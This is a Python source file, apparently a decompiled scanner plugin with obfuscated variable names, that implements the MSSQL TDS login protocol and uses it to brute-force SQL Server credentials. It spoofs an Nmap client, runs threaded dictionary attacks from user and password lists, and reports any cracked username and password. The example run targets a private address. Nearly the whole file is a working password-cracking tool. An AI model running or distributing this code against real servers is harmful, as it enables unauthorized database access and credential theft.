#Embedded file name: mssql_crack.py
import struct
import sys
import random
import socket
OO0o = 1433

class ii11i(object):

    def __init__(self):
        self.packetno = 0
        self.length = 0
        self.size = 0
        self.cli_version = 7
        self.cli_pid = 0
        self.conn_id = 0
        self.options_1 = 160
        self.options_2 = 3
        self.sqltype_flag = 0
        self.reserved_flag = 0
        self.time_zone = 0
        self.collation = 0
        self.version = 1895825409
        self.client = "Nmap"
        self.username = None
        self.password = None
        self.app = "Nmap NSE"
        self.server = "DUMMY"
        self.library = "mssql.lua"
        self.locale = ""
        self.database = "tempdb"
        self.MAC = "\x00\x00\x00\x00\x00\x00"

    def widechar(self, ch):
        return ch + "\x00"

    def widestring(self, s):
        return "".join(map(self.widechar, s))

    def encryptpass(self, s):
        O0oOO0o0 = 23130
        i1ii1iIII = ""
        for Oo0oO0oo0oO00 in s:
            Oo0oO0oo0oO00 = ord(Oo0oO0oo0oO00) ^ O0oOO0o0
            i1ii1iIII += struct.pack("H", Oo0oO0oo0oO00 >> 4 & 3855 | Oo0oO0oo0oO00 << 4 & 61680)

        return i1ii1iIII

    def to_string(self):
        iIi = 86
        self.cli_pid = random.randint(1, 100000)
        self.length = iIi + 2 * (len(self.client) + len(self.username) + len(self.password) + len(self.app) + len(self.server) + len(self.library) + len(self.database))
        Ii1IIii11 = struct.pack("<IIIIII", self.length, self.version, self.size, self.cli_version, self.cli_pid, self.conn_id)
        Ii1IIii11 += struct.pack("BBBB", self.options_1, self.options_2, self.sqltype_flag, self.reserved_flag)
        Ii1IIii11 += struct.pack("<II", self.time_zone, self.collation)
        Ii1IIii11 += struct.pack("<HH", iIi, len(self.client))
        iIi += len(self.client) * 2
        Ii1IIii11 += struct.pack("<HH", iIi, len(self.username))
        iIi += len(self.username) * 2
        Ii1IIii11 += struct.pack("<HH", iIi, len(self.password))
        iIi += len(self.password) * 2
        Ii1IIii11 += struct.pack("<HH", iIi, len(self.app))
        iIi += len(self.app) * 2
        Ii1IIii11 += struct.pack("<HH", iIi, len(self.server))
        iIi += len(self.server) * 2
        Ii1IIii11 += struct.pack("<HH", 0, 0)
        Ii1IIii11 += struct.pack("<HH", iIi, len(self.library))
        iIi += len(self.library) * 2
        Ii1IIii11 += struct.pack("<HH", iIi, len(self.locale))
        iIi += len(self.locale) * 2
        Ii1IIii11 += struct.pack("<HH", iIi, len(self.database))
        iIi += len(self.database) * 2
        Ii1IIii11 += self.MAC
        Ii1IIii11 += struct.pack("<H", iIi)
        Ii1IIii11 += struct.pack("<H", 0)
        Ii1IIii11 += struct.pack("<H", self.length)
        Ii1IIii11 += struct.pack("<H", 0)
        Ii1IIii11 += self.widestring(self.client)
        Ii1IIii11 += self.widestring(self.username)
        Ii1IIii11 += self.encryptpass(self.password)
        Ii1IIii11 += self.widestring(self.app)
        Ii1IIii11 += self.widestring(self.server)
        Ii1IIii11 += self.widestring(self.library)
        Ii1IIii11 += self.widestring(self.locale)
        Ii1IIii11 += self.widestring(self.database)
        return Ii1IIii11

    def login(self, servername, port, username, password, timeout = 10):
        self.username = username
        self.password = password
        self.server = servername
        Ii1IIii11 = self.to_string()
        iIiII = len(Ii1IIii11) + 8
        iI = 1
        iI11iiiI1II = 0
        O0oooo0Oo00 = 0
        self.packetno += 1
        Ii11iii11I = 16
        oOo00Oo00O = struct.pack(">BBHHBB%ds" % len(Ii1IIii11), Ii11iii11I, iI, iIiII, iI11iiiI1II, self.packetno, O0oooo0Oo00, Ii1IIii11)
        iI11i1I1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        iI11i1I1.settimeout(timeout)
        iI11i1I1.connect((servername, port))
        iI11i1I1.send(oOo00Oo00O)
        ii11i1iIII = ""
        Ii1I = 0
        iI = 0
        Oo0o0 = False
        i1ii1iIII = ""
        while True:
            if len(ii11i1iIII) - Ii1I < 4:
                III1ii1iII = iI11i1I1.recv(4)
                if len(III1ii1iII) > 0:
                    ii11i1iIII += III1ii1iII
                    Oo0o0 = True
                else:
                    return (None, "Fail to receive packet from MSSQL server")
            Ii11iii11I, iI, iI1 = struct.unpack_from(">BBH", ii11i1iIII, Ii1I)
            Ii1I += 4
            if Ii11iii11I != 4:
                return (None, "Server returned invalid packet")
            ii1I1i1I = iI1 - (len(ii11i1iIII) - Ii1I + 4)
            if ii1I1i1I > 0:
                III1ii1iII = iI11i1I1.recv(ii1I1i1I)
                if len(III1ii1iII) > 0:
                    ii11i1iIII += III1ii1iII
                else:
                    return (None, "Fail to receive packet from MSSQL server")
            iI11iiiI1II, OOoo0O0, O0oooo0Oo00, III1ii1iII = struct.unpack_from(">Hcc%ds" % (iI1 - 8), ii11i1iIII, Ii1I)
            i1ii1iIII += III1ii1iII
            Ii1I += 4 + (iI1 - 8)
            if iI == 1:
                break

        iI11i1I1.close()
        if not Oo0o0:
            return (None, "Unkown error")
        O0ooOooooO, = struct.unpack_from("B", i1ii1iIII, 0)
        if O0ooOooooO == 170:
            return False
        else:
            if O0ooOooooO == 227:
                return True
            return (None, "Token ERROR")


iI1I111Ii111i = None
I11IiI1I11i1i = None

def craft(arg):
    global iI1I111Ii111i
    global I11IiI1I11i1i
    oooo000, iIIIi1, iiII1i1, o00oOO0o, OOO00O = arg
    for OOoOO0oo0ooO in range(5):
        try:
            debug("[+%02d] mssql://%s:%s@%s:%d/", OOoOO0oo0ooO, o00oOO0o, OOO00O, iIIIi1, iiII1i1)
            O0o0O00Oo0o0 = ii11i()
            if O0o0O00Oo0o0.login(iIIIi1, iiII1i1, o00oOO0o, OOO00O, 10):
                iI1I111Ii111i = o00oOO0o
                I11IiI1I11i1i = OOO00O or "<empty>"
                oooo000.stop()
            break
        except Exception as O00O0oOO00O00:
            pass


def assign(service, arg = None):
    if service == '''mssql''':
        return (True, arg)


def audit(arg):
    iIIIi1, iiII1i1 = arg
    try:
        O0o0O00Oo0o0 = ii11i()
        if O0o0O00Oo0o0.login(iIIIi1, iiII1i1, "neverusedusername", "neverusedpass") != False:
            return
    except:
        debug(sys.exc_info())
        return

    oooo000 = ThreadPool(10,craft)

    i1i = util.load_password_dict(iIIIi1, "database/mssql_user.txt", "database/mssql_pass.txt")
    for iiI111I1iIiI in i1i:
        oooo000.push((oooo000,
         iIIIi1,
         iiII1i1,
         iiI111I1iIiI[0],
         iiI111I1iIiI[1]))

    oooo000.run()
    if iI1I111Ii111i:
        security_hole("%s:%d mssql password is %s/%s" % (iIIIi1,
         iiII1i1,
         iI1I111Ii111i,
         I11IiI1I11i1i))


if __name__ == '__main__':
    from dummy import *
    import threadpool
    audit(assign('''mssql''', ("192.168.0.206", 1433))[1])

#KEY---c3ff499db0ad225bc0cbd0f9cbd7910edaa8861a1f3ebe4cc7b168d1bdad3254---